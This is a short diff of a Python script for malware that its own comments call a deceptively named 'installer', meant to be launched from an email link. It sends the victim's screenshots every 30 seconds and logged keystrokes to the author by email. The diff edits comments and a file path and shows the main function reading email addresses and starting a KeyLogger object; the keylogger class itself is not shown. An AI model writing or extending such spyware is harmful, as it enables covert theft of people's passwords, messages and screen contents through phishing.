@@ -3,10 +3,7 @@
 #   and I will take no fault for your actions.
 
 # this file is named installer for deceptive reasons
-# It will act like an installation script when people click on a link in
-# an email. If the person has a mac, then they will have python natively
-# and this script will run fine. I will have to look into ways to run on windows
-
+# It will act like an "installation" script 
 
 # functionality:
 # - sends screenshot of the persons screen every 30 seconds
@@ -25,14 +22,14 @@ def main():
     Main "installation" function used to install program
     """
     # create the email from formatter, and close it
-    f = open("format.txt")
+    f = open("src/format.txt")
     my_email = f.readline().rstrip('\n')
     to_email = f.readline().rstrip('\n')
     f.close()
 
     # run the logger
     email = Email(my_email, to_email)
-    kl = KeyLogger(email) 
+    kl = KeyLogger(email) # add arguments to adjust email and log time
     kl.run_keylogger()
 
    
